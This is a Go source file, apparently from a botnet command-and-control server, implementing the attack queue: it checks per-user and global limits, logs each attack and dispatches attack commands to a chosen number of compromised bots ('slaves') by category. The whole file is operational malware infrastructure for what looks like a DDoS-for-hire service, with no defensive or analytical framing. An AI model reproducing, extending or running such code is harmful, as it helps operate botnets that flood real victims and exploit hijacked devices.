package attacks

import (
	"cnc/core/database"
	"cnc/core/slaves"
	"errors"
	"fmt"
	"sync"
	"time"
)

type QueuedAttack struct {
	Attack   *Attack
	Username string
	BotCat   string
	Start    chan bool
	Buf      []byte
}

type AttackQueue struct {
	queue []*QueuedAttack
	mu    sync.Mutex
}

var GlobalQueue = &AttackQueue{}

func init() {
	go GlobalQueue.worker()
}

func (q *AttackQueue) Submit(atk *Attack, username string, botCat string, buf []byte) (chan bool, int, int, int, error) {
	q.mu.Lock()
	defer q.mu.Unlock()

	
	for _, qa := range q.queue {
		if qa.Username == username {
			return nil, 0, 0, 0, errors.New("You already have a queued attack!")
		}
	}

	
	remaining, err := database.DatabaseConnection.GetUserOngoingAttackRemaining(username)
	if err == nil && remaining > 0 {
		return nil, 0, 0, 0, errors.New("you already have an attack running")
	}

	startChan := make(chan bool, 1)
	qa := &QueuedAttack{
		Attack:   atk,
		Username: username,
		BotCat:   botCat,
		Start:    startChan,
		Buf:      buf,
	}

	
	waitTime := 0
	globalRemaining, err := database.DatabaseConnection.GetGlobalOngoingAttackRemaining()
	if err == nil && globalRemaining > 0 {
		waitTime += globalRemaining
	}

	for _, item := range q.queue {
		waitTime += int(item.Attack.Duration)
	}

	q.queue = append(q.queue, qa)
	pos := len(q.queue)
	total := len(q.queue)

	return startChan, waitTime, pos, total, nil
}

func (q *AttackQueue) worker() {
	for {
		time.Sleep(1 * time.Second)

		
		if database.DatabaseConnection.NumOngoing() >= MaxGlobalSlots {
			continue
		}

		q.mu.Lock()
		if len(q.queue) == 0 {
			q.mu.Unlock()
			continue
		}

		
		qa := q.queue[0]
		q.queue = q.queue[1:]
		q.mu.Unlock()

		
		if err := database.DatabaseConnection.LogAttack(qa.Username, int(qa.Attack.Duration), qa.Attack.FullCommand, qa.Attack.BotCount); err != nil {
			fmt.Printf("Error logging attack: %v\n", err)
		}

		slaves.CL.QueueBuf(qa.Buf, qa.Attack.BotCount, qa.BotCat)

		
		qa.Start <- true
	}
}
